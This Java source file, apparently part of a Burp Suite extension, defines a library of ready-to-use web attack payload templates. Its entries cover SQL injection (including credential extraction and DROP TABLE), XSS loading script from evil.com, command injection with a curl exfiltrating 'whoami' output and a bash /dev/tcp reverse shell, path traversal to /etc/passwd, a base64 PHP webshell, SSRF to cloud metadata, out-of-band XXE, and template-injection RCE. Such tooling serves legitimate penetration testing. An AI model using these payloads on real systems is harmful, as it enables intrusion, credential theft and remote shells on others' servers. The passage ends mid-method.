package burp.payload;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;

import burp.AppConfig;

public class PayloadTemplateLibrary {
    
    private static final String LIBRARY_DIR = System.getProperty("user.home") + "/" + 
        AppConfig.CONFIG_DIR_NAME + "/templates";
    private static final Pattern VARIABLE_PATTERN = Pattern.compile("\\{\\{([^}]+)\\}\\}");
    
    private final Map<String, PayloadTemplate> templates;
    private final Map<String, String> globalVariables;
    private final Map<String, List<PayloadTemplate>> templatesByCategory;
    private final Object templateLock = new Object();
    
    public PayloadTemplateLibrary() {
        this.templates = new ConcurrentHashMap<>();
        this.globalVariables = new ConcurrentHashMap<>();
        this.templatesByCategory = new ConcurrentHashMap<>();
        
        initializeDefaultVariables();
        initializeDefaultTemplates();
        loadCustomTemplates();
    }
    
    private void initializeDefaultVariables() {
        globalVariables.put("database", "MySQL");
        globalVariables.put("waf", "none");
        globalVariables.put("param", "id");
        globalVariables.put("table", "users");
        globalVariables.put("column", "password");
        globalVariables.put("prefix", "");
        globalVariables.put("suffix", "");
        globalVariables.put("comment", "--");
        globalVariables.put("separator", "'");
    }
    
    private void initializeDefaultTemplates() {
        initializeSQLTemplates();
        initializeXSSTemplates();
        initializeCommandInjectionTemplates();
        initializePathTraversalTemplates();
        initializeSSRFTemplates();
        initializeXXETemplates();
        initializeSSTITemplates();
        initializeJWTTemplates();
        initializeDeserializationTemplates();
        initializeGraphQLTemplates();
    }
    
    private void initializeSQLTemplates() {
        String category = "SQL Injection";
        
        addTemplate(new PayloadTemplate(
            "sqli_basic_or", "SQL Injection - Basic OR",
            "' OR '1'='1", category, "sqli", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_basic_and", "SQL Injection - Basic AND",
            "' AND '1'='1", category, "sqli", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_union_columns", "SQL Injection - UNION Column Detection",
            "' UNION SELECT NULL,NULL,NULL--", category, "sqli", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_union_data", "SQL Injection - UNION Data Extraction",
            "' UNION SELECT username,password FROM {{table}}--", category, "sqli", 8
        ).addVariable("table", "users"));
        
        addTemplate(new PayloadTemplate(
            "sqli_error_based", "SQL Injection - Error Based",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT {{column}} FROM {{table}} LIMIT 1)))--", 
            category, "sqli", 8
        ).addVariable("column", "password").addVariable("table", "users"));
        
        addTemplate(new PayloadTemplate(
            "sqli_time_mysql", "SQL Injection - Time Based (MySQL)",
            "' AND SLEEP(5)--", category, "sqli", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_time_pgsql", "SQL Injection - Time Based (PostgreSQL)",
            "'; SELECT PG_SLEEP(5)--", category, "sqli", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_time_mssql", "SQL Injection - Time Based (MSSQL)",
            "'; WAITFOR DELAY '0:0:5'--", category, "sqli", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_bypass_comment", "SQL Injection - Comment Bypass",
            "'/**/OR/**/'1'='1", category, "sqli", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_bypass_case", "SQL Injection - Case Bypass",
            "' oR '1'='1", category, "sqli", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_mysql_comment", "SQL Injection - MySQL Comment",
            "' /*!50000OR*/ '1'='1", category, "sqli", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_double_query", "SQL Injection - Double Query",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT {{column}} FROM {{table}} LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            category, "sqli", 7
        ).addVariable("column", "password").addVariable("table", "users"));
        
        addTemplate(new PayloadTemplate(
            "sqli_stack_query", "SQL Injection - Stacked Query",
            "'; DROP TABLE {{table}}--", category, "sqli", 6
        ).addVariable("table", "users"));
        
        addTemplate(new PayloadTemplate(
            "sqli_json", "SQL Injection - JSON Parameter",
            "{\"id\":\"' OR '1'='1\"}", category, "sqli", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "sqli_array", "SQL Injection - Array Parameter",
            "id[]=' OR '1'='1", category, "sqli", 7
        ));
    }
    
    private void initializeXSSTemplates() {
        String category = "Cross-Site Scripting (XSS)";
        
        addTemplate(new PayloadTemplate(
            "xss_script_basic", "XSS - Basic Script Tag",
            "<script>alert('XSS')</script>", category, "xss", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_script_src", "XSS - Script Src",
            "<script src='https://evil.com/xss.js'></script>", category, "xss", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_img_onerror", "XSS - Image Onerror",
            "<img src=x onerror=alert('XSS')>", category, "xss", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_svg_onload", "XSS - SVG Onload",
            "<svg onload=alert('XSS')>", category, "xss", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_body_onload", "XSS - Body Onload",
            "<body onload=alert('XSS')>", category, "xss", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_event_handler", "XSS - Event Handler",
            "\"onfocus=alert('XSS') autofocus=\"", category, "xss", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_javascript_protocol", "XSS - JavaScript Protocol",
            "javascript:alert('XSS')", category, "xss", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_data_uri", "XSS - Data URI",
            "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_svg_animate", "XSS - SVG Animate",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_math_href", "XSS - Math href",
            "<math href=\"javascript:alert('XSS')\">CLICKME</math>", category, "xss", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_input_autofocus", "XSS - Input Autofocus",
            "<input autofocus onfocus=alert('XSS')>", category, "xss", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_details_ontoggle", "XSS - Details Ontoggle",
            "<details open ontoggle=alert('XSS')>", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_marquee_onstart", "XSS - Marquee Onstart",
            "<marquee onstart=alert('XSS')>", category, "xss", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_object_data", "XSS - Object Data",
            "<object data=\"javascript:alert('XSS')\">", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_embed_src", "XSS - Embed Src",
            "<embed src=\"javascript:alert('XSS')\">", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_encoded_html", "XSS - HTML Encoded",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;", category, "xss", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_encoded_hex", "XSS - Hex Encoded",
            "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;", category, "xss", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_no_parentheses", "XSS - No Parentheses",
            "<script>alert`XSS`</script>", category, "xss", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xss_template_literal", "XSS - Template Literal",
            "<script>alert(`${document.domain}`)</script>", category, "xss", 7
        ));
    }
    
    private void initializeCommandInjectionTemplates() {
        String category = "Command Injection";
        
        addTemplate(new PayloadTemplate(
            "cmd_semicolon", "Command Injection - Semicolon",
            "; ls -la", category, "cmdi", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_pipe", "Command Injection - Pipe",
            "| ls -la", category, "cmdi", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_and", "Command Injection - AND",
            "&& ls -la", category, "cmdi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_or", "Command Injection - OR",
            "|| ls -la", category, "cmdi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_backtick", "Command Injection - Backtick",
            "`ls -la`", category, "cmdi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_dollar_paren", "Command Injection - Dollar Paren",
            "$(ls -la)", category, "cmdi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_newline", "Command Injection - Newline",
            "\nls -la", category, "cmdi", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_windows_amp", "Command Injection - Windows &",
            "& dir", category, "cmdi", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_windows_pipe", "Command Injection - Windows Pipe",
            "| dir", category, "cmdi", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "cmd_blind_ping", "Command Injection - Blind Ping",
            "; ping -c 1 {{attacker_ip}}", category, "cmdi", 7
        ).addVariable("attacker_ip", "127.0.0.1"));
        
        addTemplate(new PayloadTemplate(
            "cmd_blind_curl", "Command Injection - Blind Curl",
            "; curl http://{{attacker_ip}}/?data=$(whoami)", category, "cmdi", 7
        ).addVariable("attacker_ip", "127.0.0.1"));
        
        addTemplate(new PayloadTemplate(
            "cmd_blind_nslookup", "Command Injection - Blind NSLookup",
            "; nslookup $(whoami).{{attacker_domain}}", category, "cmdi", 7
        ).addVariable("attacker_domain", "evil.com"));
        
        addTemplate(new PayloadTemplate(
            "cmd_reverse_shell", "Command Injection - Reverse Shell",
            "; bash -i >& /dev/tcp/{{attacker_ip}}/4444 0>&1", category, "cmdi", 5
        ).addVariable("attacker_ip", "127.0.0.1"));
    }
    
    private void initializePathTraversalTemplates() {
        String category = "Path Traversal";
        
        addTemplate(new PayloadTemplate(
            "traversal_basic", "Path Traversal - Basic",
            "../../../etc/passwd", category, "lfi", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_windows", "Path Traversal - Windows",
            "..\\..\\..\\windows\\system32\\config\\sam", category, "lfi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_encoded", "Path Traversal - URL Encoded",
            "..%2f..%2f..%2fetc/passwd", category, "lfi", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_double_encoded", "Path Traversal - Double Encoded",
            "..%252f..%252f..%252fetc/passwd", category, "lfi", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_null_byte", "Path Traversal - Null Byte",
            "../../../etc/passwd%00.jpg", category, "lfi", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_unicode", "Path Traversal - Unicode",
            "..%c0%af..%c0%af..%c0%afetc/passwd", category, "lfi", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_wrapper_php", "Path Traversal - PHP Wrapper",
            "php://filter/convert.base64-encode/resource={{file}}", category, "lfi", 8
        ).addVariable("file", "/etc/passwd"));
        
        addTemplate(new PayloadTemplate(
            "traversal_wrapper_expect", "Path Traversal - Expect Wrapper",
            "expect://id", category, "lfi", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_wrapper_data", "Path Traversal - Data Wrapper",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", category, "lfi", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_wrapper_input", "Path Traversal - Input Wrapper",
            "php://input", category, "lfi", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_log_poison", "Path Traversal - Log Poison",
            "/var/log/apache2/access.log", category, "lfi", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "traversal_proc_self", "Path Traversal - Proc Self",
            "/proc/self/environ", category, "lfi", 7
        ));
    }
    
    private void initializeSSRFTemplates() {
        String category = "Server-Side Request Forgery (SSRF)";
        
        addTemplate(new PayloadTemplate(
            "ssrf_localhost", "SSRF - Localhost",
            "http://127.0.0.1/admin", category, "ssrf", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_localhost_bypass", "SSRF - Localhost Bypass",
            "http://localhost/admin", category, "ssrf", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_loopback", "SSRF - Loopback",
            "http://[::1]/admin", category, "ssrf", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_decimal", "SSRF - Decimal IP",
            "http://2130706433/admin", category, "ssrf", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_hex", "SSRF - Hex IP",
            "http://0x7f000001/admin", category, "ssrf", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_octal", "SSRF - Octal IP",
            "http://0177.0.0.1/admin", category, "ssrf", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_cloud_metadata_aws", "SSRF - AWS Metadata",
            "http://169.254.169.254/latest/meta-data/", category, "ssrf", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_cloud_metadata_gcp", "SSRF - GCP Metadata",
            "http://metadata.google.internal/computeMetadata/v1/", category, "ssrf", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_cloud_metadata_azure", "SSRF - Azure Metadata",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01", category, "ssrf", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_internal_service", "SSRF - Internal Service",
            "http://internal.{{domain}}/admin", category, "ssrf", 7
        ).addVariable("domain", "example.com"));
        
        addTemplate(new PayloadTemplate(
            "ssrf_file_protocol", "SSRF - File Protocol",
            "file:///etc/passwd", category, "ssrf", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_dict_protocol", "SSRF - Dict Protocol",
            "dict://127.0.0.1:6379/info", category, "ssrf", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_gopher_protocol", "SSRF - Gopher Protocol",
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...", 
            category, "ssrf", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "ssrf_dns_rebinding", "SSRF - DNS Rebinding",
            "http://{{rebind_domain}}/admin", category, "ssrf", 5
        ).addVariable("rebind_domain", "attacker.com"));
    }
    
    private void initializeXXETemplates() {
        String category = "XML External Entity (XXE)";
        
        addTemplate(new PayloadTemplate(
            "xxe_basic", "XXE - Basic",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
            category, "xxe", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_parameter_entity", "XXE - Parameter Entity",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{attacker_ip}}/xxe.dtd\">%xxe;]><foo>test</foo>", 
            category, "xxe", 8
        ).addVariable("attacker_ip", "127.0.0.1"));
        
        addTemplate(new PayloadTemplate(
            "xxe_ssrf", "XXE - SSRF",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-server/admin\">]><foo>&xxe;</foo>", 
            category, "xxe", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_blind_oob", "XXE - Blind OOB",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{{attacker_ip}}/collect\"><!ENTITY % dtd SYSTEM \"http://{{attacker_ip}}/xxe.dtd\">%dtd;%xxe;]><foo>test</foo>", 
            category, "xxe", 7
        ).addVariable("attacker_ip", "127.0.0.1"));
        
        addTemplate(new PayloadTemplate(
            "xxe_cdata", "XXE - CDATA",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[&xxe;]]></foo>", 
            category, "xxe", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_xinclude", "XXE - XInclude",
            "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>", 
            category, "xxe", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_svg", "XXE - SVG Upload",
            "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"file:///etc/passwd\"></image></svg>", 
            category, "xxe", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_xlsx", "XXE - XLSX Upload",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
            category, "xxe", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "xxe_docx", "XXE - DOCX Upload",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
            category, "xxe", 6
        ));
    }
    
    private void initializeSSTITemplates() {
        String category = "Server-Side Template Injection (SSTI)";
        
        addTemplate(new PayloadTemplate(
            "ssti_jinja2_basic", "SSTI - Jinja2 Basic",
            "{{7*7}}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_jinja2_rce", "SSTI - Jinja2 RCE",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", category, "ssti", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_jinja2_rce_alt", "SSTI - Jinja2 RCE Alternative",
            "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}", 
            category, "ssti", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_twig_basic", "SSTI - Twig Basic",
            "{{7*7}}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_twig_rce", "SSTI - Twig RCE",
            "{{['id']|filter('system')}}", category, "ssti", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_freemarker_basic", "SSTI - Freemarker Basic",
            "${7*7}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_freemarker_rce", "SSTI - Freemarker RCE",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", category, "ssti", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_velocity_basic", "SSTI - Velocity Basic",
            "#set($x=7*7)$x", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_velocity_rce", "SSTI - Velocity RCE",
            "#set($rt=$class.inspect(\"java.lang.Runtime\").type.getRuntime())$rt.exec(\"id\")", 
            category, "ssti", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_pebble_basic", "SSTI - Pebble Basic",
            "{{7*7}}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_pebble_rce", "SSTI - Pebble RCE",
            "{% set cmd = 'id' %}{{ cmd.getClass().forName('java.lang.Runtime').getMethod('exec',cmd.getClass()).invoke(null,cmd) }}", 
            category, "ssti", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_smart_basic", "SSTI - Smarty Basic",
            "{7*7}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_smart_rce", "SSTI - Smarty RCE",
            "{system('id')}", category, "ssti", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_mako_basic", "SSTI - Mako Basic",
            "${7*7}", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_mako_rce", "SSTI - Mako RCE",
            "${self.module.cache.util.os.popen('id').read()}", category, "ssti", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_erb_basic", "SSTI - ERB Basic",
            "<%= 7*7 %>", category, "ssti", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "ssti_erb_rce", "SSTI - ERB RCE",
            "<%= system('id') %>", category, "ssti", 7
        ));
    }
    
    private void initializeJWTTemplates() {
        String category = "JWT Security";
        
        addTemplate(new PayloadTemplate(
            "jwt_none_algorithm", "JWT - None Algorithm",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.", 
            category, "jwt", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "jwt_weak_secret", "JWT - Weak Secret Detection",
            "Note: Try common secrets like 'secret', 'password', '123456', 'key'", category, "jwt", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "jwt_algorithm_confusion", "JWT - Algorithm Confusion",
            "Note: Try changing RS256 to HS256 and sign with public key", category, "jwt", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "jwt_kid_injection", "JWT - kid Injection",
            "Note: Try SQL injection in kid header parameter", category, "jwt", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "jwt_jku_spoofing", "JWT - jku Spoofing",
            "Note: Try pointing jku header to attacker-controlled JWK set", category, "jwt", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "jwt_x5u_spoofing", "JWT - x5u Spoofing",
            "Note: Try pointing x5u header to attacker-controlled certificate", category, "jwt", 6
        ));
    }
    
    private void initializeDeserializationTemplates() {
        String category = "Insecure Deserialization";
        
        addTemplate(new PayloadTemplate(
            "deser_java_basic", "Java Deserialization - Basic",
            "Note: Use ysoserial to generate payload: java -jar ysoserial.jar CommonsCollections1 'id'", 
            category, "deser", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_java_cc", "Java Deserialization - Commons Collections",
            "ysoserial payload: CommonsCollections1, CommonsCollections6, CommonsBeanutils1", 
            category, "deser", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_php_basic", "PHP Deserialization - Basic",
            "O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}", category, "deser", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_php_phar", "PHP Deserialization - PHAR",
            "Note: Create PHAR file with deserialization payload, trigger via phar:// wrapper", 
            category, "deser", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_python_pickle", "Python Deserialization - Pickle",
            "Note: Use __reduce__ to create malicious pickle payload", category, "deser", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_python_yaml", "Python Deserialization - YAML",
            "Note: PyYAML load() can execute arbitrary Python code", category, "deser", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_dotnet", ".NET Deserialization",
            "Note: Use ysoserial.net for .NET gadget chains", category, "deser", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "deser_ruby", "Ruby Deserialization - YAML",
            "--- !ruby/object:Gem::Installer\n    i: x\n", category, "deser", 6
        ));
    }
    
    private void initializeGraphQLTemplates() {
        String category = "GraphQL Security";
        
        addTemplate(new PayloadTemplate(
            "graphql_introspection", "GraphQL - Introspection",
            "{\"query\":\"{__schema{types{name}}}\"}", category, "graphql", 10
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_full_introspection", "GraphQL - Full Introspection",
            "{\"query\":\"{__schema{queryType{name}mutationType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name}}}\"}", 
            category, "graphql", 9
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_batching", "GraphQL - Query Batching",
            "[{\"query\":\"query1\"},{\"query\":\"query2\"},{\"query\":\"query3\"}]", category, "graphql", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_field_suggestion", "GraphQL - Field Suggestion",
            "{\"query\":\"{user(id:1){pasword}}\"}", category, "graphql", 7
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_directive_injection", "GraphQL - Directive Injection",
            "{\"query\":\"query{__typename @deprecated(reason: \\\"test\\\")}\"}", category, "graphql", 6
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_sql_injection", "GraphQL - SQL Injection",
            "{\"query\":\"{user(id:\\\"1' OR '1'='1\\\"){name}}\"}", category, "graphql", 8
        ));
        
        addTemplate(new PayloadTemplate(
            "graphql_nesting_dos", "GraphQL - Nesting DoS",
            "{\"query\":\"{user{friends{friends{friends{friends{name}}}}}}\"}", category, "graphql", 6
        ));
    }
    
    public void addTemplate(PayloadTemplate template) {
        if (template != null && template.getId() != null) {
            templates.put(template.getId(), template);
            
            String category = template.getCategory();
            templatesByCategory.computeIfAbsent(category, k -> new ArrayList<>()).add(template);
        }
    }
    
    public PayloadTemplate getTemplate(String id) {
        return templates.get(id);
    }
    
    public List<PayloadTemplate> getAllTemplates() {
        return new ArrayList<>(templates.values());
    }
    
    public List<PayloadTemplate> getTemplatesByCategory(String category) {
        return templatesByCategory.getOrDefault(category, new ArrayList<>());
    }
    
    public List<String> getCategories() {
        return new ArrayList<>(templatesByCategory.keySet());
    }
    
    public List<PayloadTemplate> getTemplatesByTag(String tag) {
        List<PayloadTemplate> result = new ArrayList<>();
        for (PayloadTemplate template : templates.values()) {
            if (template.getTags().contains(tag)) {
                result.add(template);
            }
        }
        return result;
    }
    
    public List<String> getAllTags() {
        Set<String> tags = new HashSet<>();
        for (PayloadTemplate template : templates.values()) {
            tags.addAll(template.getTags());
        }
        return new ArrayList<>(tags);
    }
    
    public String fillTemplate(String templateId, Map<String, String> variables) {
        PayloadTemplate template = templates.get(templateId);
        if (template == null) {
            return null;
        }
        return fillTemplate(template, variables);
    }
    
    public String fillTemplate(PayloadTemplate template, Map<String, String> variables) {
        if (template == null) {
            return null;
        }
        
        Map<String, String> mergedVars = new HashMap<>(globalVariables);
        mergedVars.putAll(template.getDefaultVariables());
        if (variables != null) {
            mergedVars.putAll(variables);
        }
        
        String payload = template.getTemplate();
        
        Matcher matcher = VARIABLE_PATTERN.matcher(payload);
        StringBuffer result = new StringBuffer();
        
        while (matcher.find()) {
            String varName = matcher.group(1);
            String replacement = mergedVars.getOrDefault(varName, matcher.group(0));
            matcher.appendReplacement(result, Matcher.quoteReplacement(replacement));
        }
        matcher.appendTail(result);
        
        return result.toString();
    }
    
    public List<String> fillAllTemplatesByCategory(String category, Map<String, String> variables) {
        List<PayloadTemplate> categoryTemplates = getTemplatesByCategory(category);
        List<String> payloads = new ArrayList<>();
        
        for (PayloadTemplate template : categoryTemplates) {
            String filled = fillTemplate(template, variables);
            if (filled != null) {
                payloads.add(filled);
            }
        }
        
        return payloads;
    }
    
    public void setGlobalVariable(String name, String value) {
        globalVariables.put(name, value);
    }
    
    public String getGlobalVariable(String name) {
        return globalVariables.get(name);
    }
    
    public Map<String, String> getGlobalVariables() {
        return new HashMap<>(globalVariables);
    }
    
    public void loadCustomTemplates() {
        File templateDir = new File(LIBRARY_DIR);
        if (!templateDir.exists()) {
            templateDir.mkdirs();
            return;
        }
        
        File[] files = templateDir.listFiles((dir, name) -> name.endsWith(".json"));
        if (files == null) return;
        
        for (File file : files) {
            try {
                String content = new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
                JSONObject json = new JSONObject(content);
                PayloadTemplate template = PayloadTemplate.fromJson(json);
                if (template != null) {
                    addTemplate(template);
                }
            } catch (Exception e) {
                System.err.println("Failed to load custom template: " + file.getName() + " - " + e.getMessage());
            }
        }
    }
    
    public void saveCustomTemplate(PayloadTemplate template) {
        if (template == null || template.getId() == null) return;
        
        File templateDir = new File(LIBRARY_DIR);
        if (!templateDir.exists()) {
            templateDir.mkdirs();
        }
        
        try {
            String filePath = LIBRARY_DIR + "/" + template.getId() + ".json";
            JSONObject json = template.toJson();
            Files.write(Paths.get(filePath), json.toString(2).getBytes(StandardCharsets.UTF_8));
            
            addTemplate(template);
        } catch (Exception e) {
            System.err.println("Failed to save custom template: " + e.getMessage());
        }
    }
    
    public void deleteCustomTemplate(String templateId) {
        templates.remove(templateId);
        
        File file = new File(LIBRARY_DIR + "/" + templateId + ".json");
        if (file.exists()) {
            file.delete();
        }
        
        for (List<PayloadTemplate> categoryTemplates : templatesByCategory.values()) {
            categoryTemplates.removeIf(t -> t.getId().equals(templateId));
        }
    }
    
    public List<PayloadTemplate> searchTemplates(String keyword) {
        List<PayloadTemplate> results = new ArrayList<>();
        String lowerKeyword = keyword.toLowerCase();
        
        for (PayloadTemplate template : templates.values()) {
            if (template.getName().toLowerCase().contains(lowerKeyword) ||
                template.getCategory().toLowerCase().contains(lowerKeyword) ||
                template.getTemplate().toLowerCase().contains(lowerKeyword) ||
                template.getTags().stream().anyMatch(t -> t.toLowerCase().contains(lowerKeyword))) {
                results.add(template);
            }
        }
        
        return results;
    }
    
    public int getTemplateCount() {
        return templates.size();
    }
    
    public Map<String, Integer> getStatistics() {
        Map<String, Integer> stats = new LinkedHashMap<>();
        stats.put("total", templates.size());
        stats.put("categories", templatesByCategory.size());
        
        int custom = 0;
        File templateDir = new File(LIBRARY_DIR);
        if (templateDir.exists()) {
            File[] files = templateDir.listFiles((dir, name) -> name.endsWith(".json"));
            custom = files != null ? files.length : 0;
        }
        stats.put("custom", custom);
        
        return stats;
    }
    
    public void exportTemplates(String filePath, List<String> templateIds) {
        try {
            JSONArray array = new JSONArray();
            for (String id : templateIds) {
                PayloadTemplate template = templates.get(id);
                if (template != null) {
                    array.put(template.toJson());
                }
            }
            
            JSONObject export = new JSONObject();
            export.put("version", "1.0");
            export.put("exportedAt", System.currentTimeMillis());
            export.put("templates", array);
            
            Files.write(Paths.get(filePath), export.toString(2).getBytes(StandardCharsets.UTF_8));
